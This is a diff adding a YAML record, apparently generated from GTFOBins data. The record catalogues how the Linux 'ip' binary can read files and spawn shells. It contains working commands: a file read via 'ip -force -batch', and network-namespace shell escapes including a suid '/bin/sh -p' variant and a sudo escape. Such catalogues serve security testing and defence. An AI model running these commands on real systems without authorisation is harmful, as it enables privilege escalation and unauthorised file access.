@@ -1,0 +1,99 @@
+id: gtfobins/ip/file-read/unprivileged
+type: binary
+platform: linux
+name: ip
+phases:
+- collection
+capabilities:
+- file-read
+privilege_required: user
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: ip -force -batch /path/to/input-file
+  comment: The read file content is corrupted by error prints.
+references:
+- https://gtfobins.github.io/gtfobins/ip/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        ip:
+          functions:
+            file-read:
+            - binary: false
+              code: ip -force -batch /path/to/input-file
+              comment: The read file content is corrupted by error prints.
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+            shell:
+            - code: 'ip netns add foo
+
+                ip netns exec foo /bin/sh
+
+                ip netns delete foo'
+              contexts:
+                sudo: null
+                suid:
+                  code: 'ip netns add foo
+
+                    ip netns exec foo /bin/sh -p
+
+                    ip netns delete foo'
+              version: This only works for Linux with `CONFIG_NET_NS=y`.
+            - code: 'ip netns add foo
+
+                ip netns exec foo /bin/ln -s /proc/1/ns/net /var/run/netns/bar
+
+                ip netns exec bar /bin/sh
+
+                ip netns delete foo
+
+                ip netns delete bar'
+              contexts:
+                sudo: null
+              version: This only works for Linux with `CONFIG_NET_NS=y`.
+    upstream_url: https://gtfobins.github.io/gtfobins/ip/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: file-read
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: collection
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:8c11ca4c280c1c3717b09e9331c08b2fe65f6913226a2272019a09ce3a30c180
